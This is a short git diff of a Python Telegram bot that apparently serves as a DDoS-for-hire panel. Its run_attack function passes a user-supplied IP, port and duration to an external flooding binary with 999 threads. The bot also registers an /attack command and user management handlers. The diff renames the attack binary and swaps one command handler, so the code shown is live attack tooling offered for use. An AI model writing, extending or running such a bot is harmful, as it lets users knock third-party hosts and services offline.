@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./golemop {ip} {port} {duration} {999}"
+        command = f"./golemxtop {ip} {port} {duration} {999}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -324,7 +324,7 @@ async def remove_user(update: Update, context: CallbackContext):
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("golem", golem))
+    application.add_handler(CommandHandler("coin", coin))
     application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("myinfo", myinfo))
     application.add_handler(CommandHandler("help", help))
